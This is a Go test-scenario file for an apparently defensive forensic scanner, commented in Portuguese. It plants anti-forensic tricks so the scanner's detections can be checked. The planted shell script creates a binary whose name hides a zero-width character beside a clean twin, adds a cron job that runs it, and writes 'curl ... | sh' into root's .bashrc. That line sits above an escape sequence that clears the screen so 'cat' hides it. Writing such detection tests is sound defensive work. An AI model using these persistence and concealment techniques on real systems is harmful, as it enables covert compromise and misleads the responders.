package scenario

// O que se LE nao e o que esta la — as duas formas, no mesmo cenario.
//
// Elas nao tem nada em comum na mecanica e tudo em comum no proposito: o alvo
// nao e a ferramenta, e o OPERADOR. Ele passa o dia no `ls`, no `cat` e no
// `grep`, e e ali que ele decide o que remover.
//
//	NO NOME     `upd<U+200D>ate` ao lado de `update`. Sao dois arquivos que se
//	            leem iguais em qualquer terminal e em qualquer captura de tela
//	            de post-mortem. Quem remover "o binario suspeito" tem 50% de
//	            chance de remover o legitimo e declarar o host limpo.
//
//	NO CONTEUDO um `\033[2J` dentro de um comentario do .bashrc. O `cat` limpa
//	            a tela ao chegar nele, e o que sobra a vista e a linha
//	            seguinte — que o invasor escreve parecendo cabecalho gerado.
//	            O comando dele fica ACIMA, fora da tela.
//
// O plantio usa escape OCTAL (\342\200\215) porque o `\x` do printf nao e
// portavel entre o coreutils e o busybox, e a matriz roda nos dois.
const textoEnganoso = `mkdir -p /usr/local/bin /etc/cron.d
	printf '#!/bin/sh\nexit 0\n' > /usr/local/bin/update
	chmod +x /usr/local/bin/update
	N=$(printf 'upd\342\200\215ate')
	cp /helper "/usr/local/bin/$N"
	chmod +x "/usr/local/bin/$N"
	printf '*/5 * * * * root /usr/local/bin/%s\n' "$N" > /etc/cron.d/zz-update
	printf 'curl -s http://198.51.100.7/a | sh\n' > /root/.bashrc
	printf '# \033[2J\033[H\n' >> /root/.bashrc
	printf '# Nao remova. Gerado de /etc/issue.conf pelo configure.\n' >> /root/.bashrc
	sleep 0.2`

func init() {
	Register(Scenario{
		ID:     "TX1-texto-que-engana-quem-le",
		Desc:   "nome com caractere invisivel ao lado do gemeo limpo, e sequencia de escape escondendo o comando dentro do .bashrc",
		Images: matriz,
		Plant:  textoEnganoso,
		Expect: []Expect{
			// O GEMEO e o que fecha a intencao: um nome invisivel sozinho e
			// esquisito, ao lado do nome limpo e disfarce montado.
			{ID: "antiforense.hidden_text", Sev: "CRITICAL",
				Evidence: "EXISTE um arquivo com o nome limpo ao lado"},
			{ID: "antiforense.hidden_text", Evidence: "juntador de largura zero"},
			// E o conteudo: o escape mora numa linha de COMENTARIO, que a coleta
			// de linhas executaveis descarta — por isso ele e campo proprio.
			{ID: "antiforense.hidden_text", Sev: "CRITICAL",
				Subject: "/root/.bashrc", Evidence: "sequência de escape"},
			{ID: "antiforense.hidden_text", Evidence: "cat -v"},
			// A linha que o escape esconde continua sendo lida pelo check que ja
			// existia: esconder do humano nao esconde do parser.
			{ID: "persist.shell_startup", Sev: "CRITICAL", Subject: "root:.bashrc"},
		},
		Exit: 2,
	})
}
